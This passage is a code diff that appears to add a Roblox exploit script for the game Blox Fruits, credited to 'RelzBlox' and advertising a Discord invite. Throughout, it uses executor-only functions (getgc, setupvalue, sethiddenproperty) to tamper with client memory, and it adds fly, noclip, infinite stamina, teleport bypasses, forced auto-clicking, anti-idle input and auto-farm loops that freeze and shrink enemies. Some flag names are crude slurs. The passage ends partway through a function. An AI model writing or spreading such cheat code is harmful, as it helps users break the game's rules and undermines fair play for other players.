+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function InfAb()
+	if InfAbility then
+		if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
+			local inf = Instance.new("ParticleEmitter");
+			inf.Acceleration = Vector3.new(0, 0, 0);
+			inf.Archivable = true;
+			inf.Drag = 20;
+			inf.EmissionDirection = Enum.NormalId.Top;
+			inf.Enabled = true;
+			inf.Lifetime = NumberRange.new(0, 0);
+			inf.LightInfluence = 0;
+			inf.LockedToPart = true;
+			inf.Name = "Agility";
+			inf.Rate = 500;
+			local numberKeypoints2 = {
+				NumberSequenceKeypoint.new(0, 0),
+				NumberSequenceKeypoint.new(1, 4)
+			};
+			inf.Size = NumberSequence.new(numberKeypoints2);
+			inf.RotSpeed = NumberRange.new(9999, 99999);
+			inf.Rotation = NumberRange.new(0, 0);
+			inf.Speed = NumberRange.new(30, 30);
+			inf.SpreadAngle = Vector2.new(0, 0, 0, 0);
+			inf.Texture = "";
+			inf.VelocityInheritance = 0;
+			inf.ZOffset = 2;
+			inf.Transparency = NumberSequence.new(0);
+			inf.Color = ColorSequence.new(Color3.fromRGB(0, 0, 0), Color3.fromRGB(0, 0, 0));
+			inf.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+		end;
+	elseif (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
+		((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility")):Destroy();
+	end;
+end;
+local LocalPlayer = (game:GetService("Players")).LocalPlayer;
+local originalstam = LocalPlayer.Character.Energy.Value;
+function infinitestam()
+	LocalPlayer.Character.Energy.Changed:connect(function()
+		if InfiniteEnergy then
+			LocalPlayer.Character.Energy.Value = originalstam;
+		end;
+	end);
+end;
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if InfiniteEnergy then
+				wait(0.1);
+				originalstam = LocalPlayer.Character.Energy.Value;
+				infinitestam();
+			end;
+		end;
+	end);
+end);
+function NoDodgeCool()
+	if nododgecool then
+		for i, v in next, getgc() do
+			if (game:GetService("Players")).LocalPlayer.Character.Dodge then
+				if typeof(v) == "function" and (getfenv(v)).script == (game:GetService("Players")).LocalPlayer.Character.Dodge then
+					for i2, v2 in next, getupvalues(v) do
+						if tostring(v2) == "0.1" then
+							repeat
+								wait(0.1);
+								setupvalue(v, i2, 0);
+							until not nododgecool;
+						end;
+					end;
+				end;
+			end;
+		end;
+	end;
+end;
+function fly()
+	local mouse = (game:GetService("Players")).LocalPlayer:GetMouse("");
+	localplayer = (game:GetService("Players")).LocalPlayer;
+	(game:GetService("Players")).LocalPlayer.Character:WaitForChild("HumanoidRootPart");
+	local torso = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+	local speedSET = 25;
+	local keys = {
+		a = false,
+		d = false,
+		w = false,
+		s = false
+	};
+	local e1;
+	local e2;
+	local function start()
+		local pos = Instance.new("BodyPosition", torso);
+		local gyro = Instance.new("BodyGyro", torso);
+		pos.Name = "EPIXPOS";
+		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge);
+		pos.position = torso.Position;
+		gyro.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000);
+		gyro.CFrame = torso.CFrame;
+		repeat
+			wait();
+			localplayer.Character.Humanoid.PlatformStand = true;
+			local new = gyro.CFrame - gyro.CFrame.p + pos.position;
+			if not keys.w and (not keys.s) and (not keys.a) and (not keys.d) then
+				speed = 1;
+			end;
+			if keys.w then
+				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed;
+				speed = speed + speedSET;
+			end;
+			if keys.s then
+				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed;
+				speed = speed + speedSET;
+			end;
+			if keys.d then
+				new = new * CFrame.new(speed, 0, 0);
+				speed = speed + speedSET;
+			end;
+			if keys.a then
+				new = new * CFrame.new((-speed), 0, 0);
+				speed = speed + speedSET;
+			end;
+			if speed > speedSET then
+				speed = speedSET;
+			end;
+			pos.position = new.p;
+			if keys.w then
+				gyro.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles((-math.rad((speed * 15))), 0, 0);
+			elseif keys.s then
+				gyro.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad((speed * 15)), 0, 0);
+			else
+				gyro.CFrame = workspace.CurrentCamera.CoordinateFrame;
+			end;
+		until not Fly;
+		if gyro then
+			gyro:Destroy();
+		end;
+		if pos then
+			pos:Destroy();
+		end;
+		flying = false;
+		localplayer.Character.Humanoid.PlatformStand = false;
+		speed = 0;
+	end;
+	e1 = mouse.KeyDown:connect(function(key)
+		if not torso or (not torso.Parent) then
+			flying = false;
+			e1:disconnect();
+			e2:disconnect();
+			return;
+		end;
+		if key == "w" then
+			keys.w = true;
+		elseif key == "s" then
+			keys.s = true;
+		elseif key == "a" then
+			keys.a = true;
+		elseif key == "d" then
+			keys.d = true;
+		end;
+	end);
+	e2 = mouse.KeyUp:connect(function(key)
+		if key == "w" then
+			keys.w = false;
+		elseif key == "s" then
+			keys.s = false;
+		elseif key == "a" then
+			keys.a = false;
+		elseif key == "d" then
+			keys.d = false;
+		end;
+	end);
+	start();
+end;
+function Click()
+	(game:GetService("VirtualUser")):CaptureController();
+	(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+end;
+function AutoHaki()
+	if not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("HasBuso") then
+		(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Buso");
+	end;
+end;
+function UnEquipWeapon(Weapon)
+	if game.Players.LocalPlayer.Character:FindFirstChild(Weapon) then
+		(game.Players.LocalPlayer.Character:FindFirstChild(Weapon)).Parent = game.Players.LocalPlayer.Backpack;
+	end;
+end;
+function EquipWeapon(ToolSe)
+	if not game.Players.LocalPlayer.Character:FindFirstChild(ToolSe) then
+		if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
+			Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe);
+			game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool);
+		end;
+	end;
+end;
+spawn(function()
+	for i, v in pairs((game:GetService("Workspace"))._WorldOrigin:GetChildren()) do
+		pcall(function()
+			if v.Name == "CurvedRing" or v.Name == "SlashHit" or v.Name == "SwordSlash" or v.Name == "SlashTail" or v.Name == "Sounds" then
+				v:Destroy();
+			end;
+		end);
+	end;
+end);
+function GetDistance(target)
+	return math.floor((target.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude);
+end;
+function BTP(p)
+	pcall(function()
+		if (p.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 1500 and (not Auto_Raid) and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
+			repeat
+				wait();
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p;
+				wait(0.05);
+				game.Players.LocalPlayer.Character.Head:Destroy();
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p;
+			until (p.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 1500 and game.Players.LocalPlayer.Character.Humanoid.Health > 0;
+		end;
+	end);
+end;
+function TelePPlayer(P)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = P;
+end;
+function TP(Pos)
+	Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+	((game:GetService("TweenService")):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Distance / TweenSpeed, Enum.EasingStyle.Linear), {
+		CFrame = Pos
+	})):Play();
+end;
+function TP1(Pos)
+	Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+	((game:GetService("TweenService")):Create((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Distance / TweenSpeed, Enum.EasingStyle.Linear), {
+		CFrame = Pos
+	})):Play();
+end;
+local stoppos = {};
+function topos(Pos)
+	local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+	local tween = ((game:GetService("TweenService")):Create((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Distance / TweenSpeed, Enum.EasingStyle.Linear), {
+		CFrame = Pos
+	})):Play();
+	function stoppos:Stop()
+		tween:Cancel();
+	end;
+	return stoppos;
+end;
+function fastpos(Pos)
+	Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+	Speed = 1000;
+	((game:GetService("TweenService")):Create((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Distance / Speed, Enum.EasingStyle.Linear), {
+		CFrame = Pos
+	})):Play();
+end;
+function slowpos(Pos)
+	Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+	Speed = 150;
+	((game:GetService("TweenService")):Create((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Distance / Speed, Enum.EasingStyle.Linear), {
+		CFrame = Pos
+	})):Play();
+end;
+local stopboat = {};
+function TPB(pos, boat)
+	local tween_s = game:service("TweenService");
+	local info = TweenInfo.new(((boat.CFrame.Position - pos.Position)).Magnitude / BoatSpeed, Enum.EasingStyle.Linear);
+	tween = tween_s:Create(boat, info, {
+		CFrame = pos
+	});
+	if (boat.CFrame.Position - pos.Position).Magnitude <= 25 then
+		tween:Cancel();
+	else
+		tween:Play();
+	end;
+	function stopboat:Stop()
+		tween:Cancel();
+	end;
+	return stopboat;
+end;
+function TPP(CFgo)
+	if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Health <= 0 or (not (game:GetService("Players")).LocalPlayer.Character:WaitForChild("Humanoid")) then
+		tween:Cancel();
+		repeat
+			wait();
+		until (game:GetService("Players")).LocalPlayer.Character:WaitForChild("Humanoid") and ((game:GetService("Players")).LocalPlayer.Character:WaitForChild("Humanoid")).Health > 0;
+		wait(7);
+		return;
+	end;
+	local tween_s = game:service("TweenService");
+	local info = TweenInfo.new((((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - CFgo.Position)).Magnitude / TweenSpeed, Enum.EasingStyle.Linear);
+	tween = tween_s:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, info, {
+		CFrame = CFgo
+	});
+	tween:Play();
+	local tweenfunc = {};
+	function tweenfunc:Stop()
+		tween:Cancel();
+	end;
+	return tweenfunc;
+end;
+spawn(function()
+	while wait() do
+		if _G.SpinPos then
+			Pos = CFrame.new(0, PosY, -20);
+			wait(0.1);
+			Pos = CFrame.new(-20, PosY, 0);
+			wait(0.1);
+			Pos = CFrame.new(0, PosY, 20);
+			wait(0.1);
+			Pos = CFrame.new(20, PosY, 0);
+		else
+			Pos = CFrame.new(0, PosY, 0);
+		end;
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoAdvanceDungeon or _G.AutoDoughtBoss or _G.Auto_DungeonMobAura or _G.AutoFarmChest or _G.AutoFactory or _G.AutoFarmBossHallow or _G.AutoFarmSwanGlasses or _G.AutoLongSword or _G.AutoBlackSpikeycoat or _G.AutoElectricClaw or _G.AutoFarmGunMastery or _G.AutoHolyTorch or _G.AutoLawRaid or _G.AutoFarmBoss or _G.AutoTwinHooks or _G.AutoOpenSwanDoor or _G.AutoDragon_Trident or _G.AutoSaber or _G.AutoFarmFruitMastery or _G.AutoFarmGunMastery or _G.TeleportIsland or _G.Auto_EvoRace or _G.AutoFarmAllMsBypassType or _G.AutoObservationv2 or _G.AutoMusketeerHat or _G.AutoEctoplasm or _G.AutoRengoku or _G.Auto_Rainbow_Haki or _G.AutoObservation or _G.AutoDarkDagger or _G.Safe_Mode or _G.MasteryFruit or _G.AutoBudySword or _G.AutoOderSword or _G.AutoBounty or _G.AutoAllBoss or _G.Auto_Bounty or _G.AutoSharkman or _G.Auto_Mastery_Fruit or _G.Auto_Mastery_Gun or _G.Auto_Dungeon or _G.Auto_Cavender or _G.Auto_Pole or _G.Auto_Kill_Ply or _G.Auto_Factory or _G.AutoSecondSea or _G.TeleportPly or _G.AutoBartilo or _G.Auto_DarkBoss or _G.GrabChest or _G.AutoFarmBounty or _G.Holy_Torch or _G.AutoFarm or _G.Clip or FarmBoss or _G.AutoElitehunter or _G.AutoThirdSea or _G.Auto_Bone or _G.Autoheart or _G.Autodoughking or _G.AutoFarmMaterial or _G.AutoNevaSoulGuitar or _G.Auto_Dragon_Trident or _G.Autotushita or _G.d or _G.Autowaden or _G.Autogay or _G.Autopole or _G.Autosaw or _G.AutoObservationHakiV2 or _G.AutoFarmNearest or AutoFarmChest or _G.AutoCarvender or _G.AutoTwinHook or AutoMobAura or _G.Tweenfruit or _G.TeleportNPC or _G.Leather or _G.Auto_Wing or _G.Umm or _G.Makori_gay or Radioactive or Fish or Gunpowder or Dragon_Scale or Cocoafarm or Scrap or MiniHee or _G.AutoFarmSeabaest or Auto_Cursed_Dual_Katana or _G.AutoFarmMob or _G.AutoMysticIsland or _G.AutoFarmDungeon or _G.AutoRaidPirate or _G.AutoQuestRace or _G.TweenMGear or (getgenv()).AutoFarm or _G.AutoPlayerHunter or _G.AutoFactory or Grab_Chest or _G.Namfon or _G.AutoSwordMastery or _G.Auto_Seabest or _G.AutoSeaBest or _G.AutoKillTial or _G.Auto_Saber or _G.Position_Spawn or _G.Farmfast or _G.AutoRace or _G.RaidPirate or Open_Color_Haki or _G.AutoTerrorshark or FarmShark or _G.farmpiranya or _G.Fish_Crew_Member == true or _G.RelzPirateBrigade or _G.RelzPirateGrandBrigade or _G.SailBoat or _G.AutoFarmAllBoss or _G.TeleportKitsune or _G.RelzFishBoat then
+				if not (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+					local Noclip = Instance.new("BodyVelocity");
+					Noclip.Name = "BodyClip";
+					Noclip.Parent = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart;
+					Noclip.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
+					Noclip.Velocity = Vector3.new(0, 0, 0);
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoAdvanceDungeon or _G.AutoDoughtBoss or _G.Auto_DungeonMobAura or _G.AutoFarmChest or _G.AutoFactory or _G.AutoFarmBossHallow or _G.AutoFarmSwanGlasses or _G.AutoLongSword or _G.AutoBlackSpikeycoat or _G.AutoElectricClaw or _G.AutoFarmGunMastery or _G.AutoHolyTorch or _G.AutoLawRaid or _G.AutoFarmBoss or _G.AutoTwinHooks or _G.AutoOpenSwanDoor or _G.AutoDragon_Trident or _G.AutoSaber or _G.AutoFarmFruitMastery or _G.AutoFarmGunMastery or _G.TeleportIsland or _G.Auto_EvoRace or _G.AutoFarmAllMsBypassType or _G.AutoObservationv2 or _G.AutoMusketeerHat or _G.AutoEctoplasm or _G.AutoRengoku or _G.Auto_Rainbow_Haki or _G.AutoObservation or _G.AutoDarkDagger or _G.Safe_Mode or _G.MasteryFruit or _G.AutoBudySword or _G.AutoOderSword or _G.AutoBounty or _G.AutoAllBoss or _G.Auto_Bounty or _G.AutoSharkman or _G.Auto_Mastery_Fruit or _G.Auto_Mastery_Gun or _G.Auto_Dungeon or _G.Auto_Cavender or _G.Auto_Pole or _G.Auto_Kill_Ply or _G.Auto_Factory or _G.AutoSecondSea or _G.TeleportPly or _G.AutoBartilo or _G.Auto_DarkBoss or _G.GrabChest or _G.AutoFarmBounty or _G.Holy_Torch or _G.AutoFarm or _G.Clip or FarmBoss or _G.AutoElitehunter or _G.AutoThirdSea or _G.Auto_Bone or _G.Autoheart or _G.Autodoughking or _G.AutoFarmMaterial or _G.AutoNevaSoulGuitar or _G.Auto_Dragon_Trident or _G.Autotushita or _G.d or _G.Autowaden or _G.Autogay or _G.Autopole or _G.Autosaw or _G.AutoObservationHakiV2 or _G.AutoFarmNearest or AutoFarmChest or _G.AutoCarvender or _G.AutoTwinHook or AutoMobAura or _G.Tweenfruit or _G.TeleportNPC or _G.Leather or _G.Auto_Wing or _G.Umm or _G.Makori_gay or Radioactive or Fish or Gunpowder or Dragon_Scale or Cocoafarm or Scrap or MiniHee or _G.AutoFarmSeabaest or Auto_Cursed_Dual_Katana or _G.AutoFarmMob or _G.AutoMysticIsland or _G.AutoFarmDungeon or _G.AutoRaidPirate or _G.AutoQuestRace or _G.TweenMGear or (getgenv()).AutoFarm or _G.AutoPlayerHunter or _G.AutoFactory or Grab_Chest or _G.Namfon or _G.AutoSwordMastery or _G.Auto_Seabest or _G.AutoSeaBest or _G.AutoKillTial or _G.Auto_Saber or _G.Position_Spawn or _G.Farmfast or _G.AutoRace or _G.RaidPirate or Open_Color_Haki or _G.AutoTerrorshark or FarmShark or _G.farmpiranya or _G.Fish_Crew_Member == true or _G.RelzPirateBrigade or _G.RelzPirateGrandBrigade or _G.SailBoat or _G.AutoFarmAllBoss or _G.TeleportKitsune or _G.RelzFishBoat then
+				local player = (game:GetService("Players")).LocalPlayer;
+				local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid");
+				if humanoid then
+					local state = humanoid:GetState();
+					if state ~= Enum.HumanoidStateType.Seated and state ~= Enum.HumanoidStateType.Running and state ~= Enum.HumanoidStateType.Landed then
+						humanoid:ChangeState(5);
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		(game:GetService("RunService")).Stepped:Connect(function()
+			if _G.AutoAdvanceDungeon or _G.AutoDoughtBoss or _G.Auto_DungeonMobAura or _G.AutoFarmChest or _G.AutoFactory or _G.AutoFarmBossHallow or _G.AutoFarmSwanGlasses or _G.AutoLongSword or _G.AutoBlackSpikeycoat or _G.AutoElectricClaw or _G.AutoFarmGunMastery or _G.AutoHolyTorch or _G.AutoLawRaid or _G.AutoFarmBoss or _G.AutoTwinHooks or _G.AutoOpenSwanDoor or _G.AutoDragon_Trident or _G.AutoSaber or _G.NoClip or _G.AutoFarmFruitMastery or _G.AutoFarmGunMastery or _G.TeleportIsland or _G.Auto_EvoRace or _G.AutoFarmAllMsBypassType or _G.AutoObservationv2 or _G.AutoMusketeerHat or _G.AutoEctoplasm or _G.AutoRengoku or _G.Auto_Rainbow_Haki or _G.AutoObservation or _G.AutoDarkDagger or _G.Safe_Mode or _G.MasteryFruit or _G.AutoBudySword or _G.AutoOderSword or _G.AutoBounty or _G.AutoAllBoss or _G.Auto_Bounty or _G.AutoSharkman or _G.Auto_Mastery_Fruit or _G.Auto_Mastery_Gun or _G.Auto_Dungeon or _G.Auto_Cavender or _G.Auto_Pole or _G.Auto_Kill_Ply or _G.Auto_Factory or _G.AutoSecondSea or _G.TeleportPly or _G.AutoBartilo or _G.Auto_DarkBoss or _G.GrabChest or _G.AutoFarmBounty or _G.Holy_Torch or _G.AutoFarm or _G.Clip or _G.AutoElitehunter or _G.AutoThirdSea or _G.Auto_Bone or _G.Autoheart or _G.Autodoughking or _G.AutoFarmMaterial or _G.AutoNevaSoulGuitar or _G.Auto_Dragon_Trident or _G.Autotushita or _G.Autowaden or _G.Autogay or _G.Autopole or _G.Autosaw or _G.AutoObservationHakiV2 or _G.AutoFarmNearest or _G.AutoCarvender or _G.AutoTwinHook or AutoMobAura or _G.Tweenfruit or _G.TeleportNPC or _G.AutoKai or _G.Leather or _G.Auto_Wing or _G.Umm or _G.Makori_gay or Radioactive or Fish or Gunpowder or Dragon_Scale or Cocoafarm or Scrap or MiniHee or _G.AutoFarmSeabaest or Auto_Cursed_Dual_Katana or _G.AutoFarmMob or _G.AutoMysticIsland or _G.AutoFarmDungeon or _G.AutoRaidPirate or _G.AutoQuestRace or _G.TweenMGear or (getgenv()).AutoFarm or _G.AutoPlayerHunter or _G.AutoFactory or _G.Namfon or _G.AutoSwordMastery or _G.Auto_Seabest or _G.AutoSeaBest or _G.AutoKillTial or _G.Auto_Saber or _G.Position_Spawn or _G.TPB or _G.Farmfast or _G.AutoRace or _G.RaidPirate or Open_Color_Haki or _G.AutoTerrorshark or FarmShark or _G.farmpiranya or _G.SailBoat or _G.RelzPirateBrigade or _G.RelzPirateGrandBrigade or _G.AutoFarmChest or _G.ChestBypass or _G.Fish_Crew_Member == true or _G.AutoFarmAllBoss or _G.TeleportKitsune or _G.RelzFishBoat then
+				for _, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.CanCollide = false;
+					end;
+				end;
+			end;
+		end);
+	end);
+end);
+function InstancePos(pos)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos;
+end;
+function TP3(pos)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos;
+end;
+spawn(function()
+	(game:GetService("RunService")).RenderStepped:Connect(function()
+		if _G.AutoClick or Fastattack then
+			pcall(function()
+				(game:GetService("VirtualUser")):CaptureController();
+				(game:GetService("VirtualUser")):Button1Down(Vector2.new(0, 1, 0, 1));
+			end);
+		end;
+	end);
+end);
+function StopTween(target)
+	if not target then
+		_G.StopTween = true;
+		wait();
+		topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+		wait();
+		if (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+			((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip")):Destroy();
+		end;
+		_G.StopTween = false;
+		_G.Clip = false;
+	end;
+	if game.Players.LocalPlayer.Character:FindFirstChild("Highlight") then
+		(game.Players.LocalPlayer.Character:FindFirstChild("Highlight")):Destroy();
+	end;
+end;
+spawn(function()
+	pcall(function()
+		while wait() do
+			for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+				if v:IsA("Tool") then
+					if v:FindFirstChild("RemoteFunctionShoot") then
+						SelectWeaponGun = v.Name;
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+(game:GetService("Players")).LocalPlayer.Idled:connect(function()
+	(game:GetService("VirtualUser")):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame);
+	wait(1);
+	(game:GetService("VirtualUser")):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame);
+end);
+MainTab:Seperator("Main");
+Time = MainTab:Label("Executor Time");
+function UpdateTime()
+	local GameTime = math.floor(workspace.DistributedGameTime + 0.5);
+	local Hour = math.floor(GameTime / 60 ^ 2) % 24;
+	local Minute = math.floor(GameTime / 60 ^ 1) % 60;
+	local Second = math.floor(GameTime / 60 ^ 0) % 60;
+	Time:Set("[GameTime] : Hours : " .. Hour .. " Min : " .. Minute .. " Sec : " .. Second);
+end;
+spawn(function()
+	while task.wait() do
+		pcall(function()
+			UpdateTime();
+		end);
+	end;
+end);
+Client = MainTab:Label("Client");
+function UpdateClient()
+	local Fps = workspace:GetRealPhysicsFPS();
+	Client:Set("[Fps] : " .. Fps);
+end;
+spawn(function()
+	while true do
+		wait(0.1);
+		UpdateClient();
+	end;
+end);
+Client1 = MainTab:Label("Client");
+function UpdateClient1()
+	local Ping = (game:GetService("Stats")).Network.ServerStatsItem["Data Ping"]:GetValueString();
+	Client1:Set("[Ping] : " .. Ping);
+end;
+spawn(function()
+	while true do
+		wait(0.1);
+		UpdateClient1();
+	end;
+end);
+MainTab:Label("Script By RelzBlox#6078");
+MainTab:Button("Copy Discord Link", function()
+	setclipboard("https://discord.com/invite/25ms");
+end);
+MainTab:Seperator("Level Farm");
+local WeaponList = {
+	"Melee",
+	"Sword",
+	"Fruit",
+	"Gun"
+};
+_G.SelectWeapon = "Melee";
+MainTab:Dropdown("Select Weapon", WeaponList, _G.SelectWeapon, function(value)
+	_G.SelectWeapon = value;
+end);
+task.spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.SelectWeapon == "Melee" then
+				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Melee" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							_G.SelectWeapon = v.Name;
+						end;
+					end;
+				end;
+			elseif _G.SelectWeapon == "Sword" then
+				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Sword" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							_G.SelectWeapon = v.Name;
+						end;
+					end;
+				end;
+			elseif _G.SelectWeapon == "Gun" then
+				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Gun" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							_G.SelectWeapon = v.Name;
+						end;
+					end;
+				end;
+			elseif _G.SelectWeapon == "Fruit" then
+				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if v.ToolTip == "Blox Fruit" then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
+							_G.SelectWeapon = v.Name;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+local ListF = {
+	"Normal",
+	"Auto Quest",
+	"Nearest"
+};
+FarmMode = "Normal";
+MainTab:Dropdown("Farm Mode", ListF, FarmMode, function(value)
+	FarmMode = value;
+end);
+MainTab:Toggle("Start Auto Farm", _G.AutoFarm, "Auto Farm Selected Mode", function(value)
+	_G.AutoFarm = value;
+	StopTween(_G.AutoFarm);
+end);
+spawn(function()
+	while wait() do
+		if FarmMode == "Normal" and _G.AutoFarm then
+			pcall(function()
+				CheckQuest();
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, NameMon) then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude > 1500 then
+							BTP(CFrameQuest);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude < 1500 then
+							TP1(CFrameQuest);
+						end;
+					else
+						TP1(CFrameQuest);
+					end;
+					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CFrameQuest.Position).Magnitude <= 5 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == Mon then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
+										repeat
+											task.wait(_G.FastAttackDelay);
+											StartBring = true;
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											-- v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											AttackNoCD();
+										until not _G.AutoFarm or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+									end;
+								end;
+							end;
+						end;
+					else
+						TP1(CFrameMon);
+						UnEquipWeapon(_G.SelectWeapon);
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if FarmMode == "Nearest" and _G.AutoFarm then
+			pcall(function()
+				for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+					if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+						if v.Name then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 5000 then
+								repeat
+									wait(_G.FastAttackDelay);
+									StartBring = true;
+									AttackNoCD();
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									TP1(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+									v.HumanoidRootPart.Transparency = 1;
+									v.Humanoid.JumpPower = 0;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.CanCollide = false;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+								until not _G.AutoFarm or (not v.Parent) or v.Humanoid.Health <= 0 or (not game.Workspace.Enemies:FindFirstChild(v.Name));
+								StartBring = false;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if FarmMode == "Auto Quest" and _G.AutoFarm then
+			pcall(function()
+				CheckQuest();
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, NameMon) then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
